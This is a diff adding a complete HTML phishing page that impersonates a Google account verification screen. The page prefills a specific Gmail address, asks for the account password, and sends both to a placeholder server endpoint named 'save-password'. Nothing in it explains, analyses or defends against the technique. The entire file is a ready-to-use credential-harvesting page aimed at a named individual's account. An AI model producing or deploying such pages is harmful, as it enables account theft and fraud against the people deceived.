@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Account Verification</title>
+</head>
+<body>
+    <h2>Verify Your Google Account</h2>
+    <p>Enter your password to verify your account:</p>
+    <form action="https://your-server.com/save-password" method="POST">
+        <label for="email">Email:</label>
+        <input type="email" name="email" value="pieswagyouknow@gmail.com" readonly>
+
+
+
+        <label for="password">Password:</label>
+        <input type="password" name="password" required>
+
+
+
+        <input type="submit" value="Verify">
+    </form>
+</body>
+</html>
